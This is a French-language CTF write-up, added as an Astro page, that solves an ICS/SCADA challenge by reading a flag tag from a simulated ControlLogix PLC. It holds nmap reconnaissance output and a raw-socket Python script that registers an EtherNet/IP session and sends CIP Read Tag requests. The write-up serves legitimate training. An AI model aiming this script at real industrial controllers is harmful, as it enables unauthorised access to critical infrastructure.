@@ -1,0 +1,143 @@
+---
+import Layout from '../../layouts/Layout.astro'
+---
+<Layout title="CTF - Ether Tag">
+
+  <div style="margin-bottom:2rem;">
+    <a href="/writeups" style="color:#475569; font-size:0.82rem;">← writeups</a>
+    <h1 style="font-size:1.8rem; font-weight:700; color:#e2e8f0; margin:0.75rem 0 0.5rem;">CTF - Ether Tag</h1>
+    <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center; margin-bottom:0.75rem;">
+      <span class="badge-ctf">CTF</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#94a3b8; font-size:0.82rem;">ICS / SCADA</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#475569; font-size:0.8rem;">01 Apr 2026</span>
+    </div>
+    <div style="display:flex; flex-wrap:wrap; gap:0.35rem; margin-top:0.5rem;">
+      <span style="background:rgba(99,102,241,0.1); color:#818cf8; border:1px solid rgba(99,102,241,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">EtherNet/IP</span>
+      <span style="background:rgba(99,102,241,0.1); color:#818cf8; border:1px solid rgba(99,102,241,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CIP</span>
+      <span style="background:rgba(99,102,241,0.1); color:#818cf8; border:1px solid rgba(99,102,241,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">ICS/SCADA</span>
+    </div>
+  </div>
+
+  <div style="background:var(--bg-800); border-left:3px solid #6366f1; border-top:1px solid var(--border); border-right:1px solid var(--border); border-bottom:1px solid var(--border); border-radius:0 8px 8px 0; padding:1rem 1.25rem; margin-bottom:2rem;">
+    <div style="color:#64748b; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.4rem;">Résumé</div>
+    <p style="color:#94a3b8; font-size:0.88rem; line-height:1.7; margin:0;">Challenge CTF ICS/SCADA — exploitation du protocole EtherNet/IP (CIP) via socket brut pour lire un tag FLAG stocké comme tableau DINT sur un simulateur Rockwell Allen-Bradley ControlLogix. Les librairies haut niveau (pycomm3) échouent sur ce simulateur partiel.</p>
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <div style="color:#334155; font-size:0.78rem; margin-bottom:0.75rem;">$ cat attack_chain.txt</div>
+    <div style="border:1px solid var(--border); border-radius:8px; overflow:hidden;">
+      <div style="background:#050508; padding:0.4rem 1rem; border-bottom:1px solid var(--border); color:#475569; font-size:0.7rem; text-transform:uppercase;">Chaîne d'exploitation</div>
+      {[
+        { n:'1', v:'Identification protocole EtherNet/IP via Nmap + List Identity', r:'Port 31751 custom, simulateur ControlLogix 1756-L61' },
+        { n:'2', v:'RegisterSession (commande 0x65)', r:'Session handle obtenu' },
+        { n:'3', v:'ReadTag CIP (0x4C) avec count=50', r:'Tableau DINT décodé en ASCII → flag' },
+      ].map((s,i,a) => (
+        <div style={"display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800);" + (i<a.length-1?"border-bottom:1px solid #0d0d15;":"")}>
+          <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#6366f122; color:#818cf8; border:1px solid #6366f144;">{s.n}</div>
+          <div><div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">{s.v}</div><div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ {s.r}</div></div>
+        </div>
+      ))}
+    </div>
+  </div>
+
+  <div class="prose">
+
+    <h2>Contexte & Protocole</h2>
+    <p>EtherNet/IP (Ethernet Industrial Protocol) est un protocole de communication industriel développé par Rockwell Automation et standardisé par ODVA. Il utilise le protocole CIP (Common Industrial Protocol) encapsulé dans des trames TCP/IP standard.</p>
+    <p>Ports standards : TCP 44818 (EtherNet/IP principal), UDP 2222 (I/O). Ce CTF utilise le port 31751 (port custom).</p>
+    <p>Deux commandes principales :</p>
+    <ul>
+      <li><strong>0x65</strong> — RegisterSession : établir une session avec le contrôleur</li>
+      <li><strong>0x6F</strong> — SendRRData : envoyer une requête CIP (lecture/écriture de tags)</li>
+    </ul>
+
+    <h2>Reconnaissance</h2>
+    <pre is:raw>nmap -sV -p 44818,2222,31751 154.57.164.83
+
+PORT      STATE    SERVICE
+2222/tcp  filtered EtherNetIP-1
+31751/tcp open     unknown
+44818/tcp closed   EtherNetIP-2
+
+# Port standard fermé, 31751 répond — port custom</pre>
+    <p>La commande List Identity (0x63) identifie le contrôleur : <strong>Rockwell Allen-Bradley ControlLogix 1756-L61</strong>.</p>
+
+    <h2>Obstacles rencontrés</h2>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ OBSTACLE 1 — pycomm3 échoue : le simulateur CTF n'implémente pas Get Instance Attribute List. Erreur : pycomm3.exceptions.ResponseError: failed to get attribute list</div>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ OBSTACLE 2 — Lecture directe pycomm3 → "FLAG, None, None, Tag doesn't exist - FLAG"</div>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ OBSTACLE 3 — Premières tentatives socket brut avec 0x65 au lieu de 0x6F → réponses incorrectes</div>
+    <p><strong>Découverte clé</strong> : FLAG est un tableau DINT. count=1 retourne 'H' (0x48). En augmentant count, le serveur retourne plusieurs éléments. Chaque caractère est encodé en little-endian 16 bits ('H' = 0x48 0x00).</p>
+
+    <h2>Script d'exploitation (Socket Brut)</h2>
+    <pre is:raw>import socket, struct
+
+def register_session(s):
+    # Commande 0x65 — RegisterSession
+    reg = b'\x65\x00\x04\x00' + b'\x00'*20 + b'\x01\x00\x00\x00'
+    s.send(reg)
+    return s.recv(1024)[4:8]  # session handle (4 octets)
+
+def read_tag(s, session, tag_name, count=50):
+    tag = tag_name.encode('utf-8')
+    epath = bytes([0x91, len(tag)]) + tag
+    # Service CIP 0x4C (Read Tag) avec paramètre count
+    cip = bytes([0x4C, len(epath)//2]) + epath + struct.pack('&lt;H', count)
+    # Encapsulation CPF
+    cpf = b'\x02\x00\x00\x00\x00\x00\xb2\x00' + struct.pack('&lt;H', len(cip)) + cip
+    payload = b'\x00\x00\x00\x00\x0a\x00' + cpf
+    # Header EtherNet/IP avec commande 0x6F (SendRRData)
+    header = b'\x6f\x00' + struct.pack('&lt;H', len(payload)) + session + b'\x00'*16
+    s.send(header + payload)
+    resp = s.recv(4096)
+    return resp[40:].decode('utf-8', errors='ignore')
+
+s = socket.socket()
+s.connect(('154.57.164.83', 31751))
+session = register_session(s)
+print("Session:", session.hex())
+
+# count progressif pour révéler le flag
+flag = read_tag(s, session, 'FLAG', 50)
+print("FLAG:", flag)
+s.close()
+
+# count=1  → H
+# count=10 → HTB{3th3rn
+# count=20 → HTB{3th3rn3t1p_pwn3d
+# count=50 → HTB{3th3rn3t1p_pwn3d}</pre>
+
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Leçons apprises</h2>
+    <div style="display:flex; flex-direction:column; gap:0.5rem;">
+      {[
+        'EtherNet/IP : deux commandes clés 0x65 (RegisterSession) et 0x6F (SendRRData)',
+        'Service CIP 0x4C (Read Tag) accepte un paramètre count pour lire des tableaux',
+        'Un DINT retournant \'H\' est un indice fort : début d\'un tableau de caractères ASCII',
+        'Les simulateurs CTF n\'implémentent pas tous les services CIP — librairies haut niveau inutilisables',
+        'Les données DINT sont encodées en little-endian 16 bits par élément',
+        'La commande List Identity (0x63) est essentielle pour identifier le type de contrôleur',
+      ].map(l => (
+        <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>{l}</div>
+      ))}
+    </div>
+  </div>
+
+  <div>
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Outils utilisés</h2>
+    <div style="display:flex; flex-wrap:wrap; gap:0.4rem;">
+      {['nmap','python3 (socket brut)','wireshark'].map(t => (
+        <span style="background:#050508; border:1px solid #1a1a2e; padding:3px 10px; border-radius:6px; font-size:0.75rem; color:#64748b; font-family:monospace;">{t}</span>
+      ))}
+    </div>
+  </div>
+
+  <div style="margin-top:3rem; padding-top:1.5rem; border-top:1px solid var(--border); display:flex; justify-content:space-between;">
+    <a href="/writeups" style="color:#475569; font-size:0.85rem;">← Tous les writeups</a>
+    <a href="/about" style="color:var(--cyber); font-size:0.85rem;">About →</a>
+  </div>
+
+</Layout>
